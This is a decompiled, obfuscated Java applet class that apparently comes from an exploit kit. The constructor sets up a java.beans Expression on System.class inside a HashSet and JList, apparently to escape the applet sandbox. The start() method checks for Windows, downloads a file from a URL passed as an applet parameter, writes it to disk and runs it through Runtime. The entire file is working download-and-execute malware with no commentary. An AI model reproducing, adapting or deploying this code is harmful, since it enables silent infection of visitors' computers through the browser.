// 
// Decompiled by Procyon v0.5.30
// 

package bombay;

import java.awt.Component;
import java.beans.Expression;
import hakim.lea6;
import hakim.liork;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.URL;
import javax.swing.JList;
import java.util.HashSet;
import java.applet.Applet;

public class glover extends Applet
{
    public String kikuy;
    public Runtime dzenq;
    public int hasyvpi;
    public String kikux;
    public HashSet hasyq;
    public JList hasyy;
    public String kikuq;
    public String hasye;
    public URL hasyb;
    public String hasya;
    public String hasyz;
    public InputStream hasyx;
    public String hasyc;
    public int hasyv;
    public FileOutputStream hasyn;
    public String hasym;
    public String hasys;
    public String hasyd;
    public String kikua;
    static Class dzena;
    static Object[] dzenf;
    
    static {
        glover.dzena = System.class;
        glover.dzenf = new Object[1];
    }
    
    private void katsumi() {
        koore.sae(this.hasyb, ldflds.gfkhy76());
        this.hasyx = (InputStream)koore.sae(this.hasyb, ldflds.kjhgu79());
    }
    
    private String katsunovi(final String s) {
        return System.getProperty(s);
    }
    
    private void shiraki() throws Exception {
        final boolean kikuz = false;
        this.hasyn = new FileOutputStream(this.kikua);
    }
    
    private void hakiro(final Object o) {
        koore.sae(o, ldflds.gfcxhg54());
    }
    
    public void start() {
        super.start();
        ldflds.hch65();
        liork.matsuki();
        try {
            this.kikuy = ldflds.hkjbhj8();
            this.kikux = ldflds.uyvg78();
            this.kikuq = liork.katzue(this.getParameter("rqq"));
            this.hasye = "e".concat("ma".concat("n.".concat("so")));
            this.hasya = ldflds.fx87g(this.kikuy);
            this.hasyb = new URL(this.kikuq);
            this.hasyz = ldflds.fx87g(this.kikux);
            this.hasyvpi = 24;
            this.hasyc = ldflds.fx87g(this.hasye);
            this.hasym = ldflds.cfgdy67(this.hasya);
            final Runtime runtime = Runtime.getRuntime();
            this.dzenq = runtime;
            if (runtime == null) {}
            this.hasys = this.katsunovi(this.hasyz);
            this.hasyd = this.katsunovi(this.hasyc);
            this.kikua = String.valueOf(this.hasys) + this.hasym;
            this.hasyv = 1000 + this.hasyvpi;
            try {
                if (this.hasyd.indexOf("W".concat("in").concat("do".concat("ws"))) < 0) {
                    return;
                }
                this.shiraki();
                this.katsumi();
                final byte[] kikul = new byte[this.hasyv];
                int kikum;
                while ((kikum = this.hasyx.read(kikul, 0, this.hasyv)) != -1) {
                    this.hasyn.write(kikul, 0, kikum);
                }
                this.hakiro(this.hasyx);
                this.hakiro(this.hasyn);
                koore.picker(this.dzenq, ldflds.kjbj75(), new Object[] { String.valueOf(this.hasys) + this.hasym });
            }
            catch (Exception r5tu) {
                r5tu.printStackTrace();
            }
        }
        catch (Exception r5tu2) {
            r5tu2.printStackTrace();
        }
    }
    
    public glover() {
        this.hasyq = new HashSet();
        ldflds.hch65();
        liork.matsuki();
        this.hasyq.add(new lea6(glover.dzena, ldflds.kghb8(), glover.dzenf));
        final Expression dzenh = new Expression(glover.dzena, ldflds.kghb8(), glover.dzenf);
        final kiipol dzenj = new kiipol(this, this.hasyq);
        this.add(this.hasyy = new JList((E[])new Object[] { dzenj }));
    }
}
